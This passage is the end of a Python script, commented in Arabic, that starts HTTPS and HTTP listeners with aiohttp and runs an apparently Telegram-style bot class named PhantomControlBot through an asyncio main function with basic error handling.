                site = web.TCPSite(runner, '0.0.0.0', 8443, ssl_context=ssl_context)
                await site.start()
                logger.info("✅ HTTPS يعمل على المنفذ 8443")
        except Exception as e:
            logger.warning(f"⚠️ فشل تشغيل HTTPS: {e}")
        
        # تشغيل HTTP
        site = web.TCPSite(runner, '0.0.0.0', 8080)
        await site.start()
        logger.info("✅ HTTP يعمل على المنفذ 8080")

# ===== الدالة الرئيسية =====
async def main():
    """الدالة الرئيسية"""
    # إنشاء البوت
    bot = PhantomControlBot(BOT_TOKEN)
    
    # تشغيل النظام
    await bot.run()

if __name__ == "__main__":
    # التحقق من المتطلبات
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("⏹️ تم إيقاف النظام بواسطة المستخدم")
    except Exception as e:
        logger.error(f"❌ خطأ فادح: {e}")
        sys.exit(1)
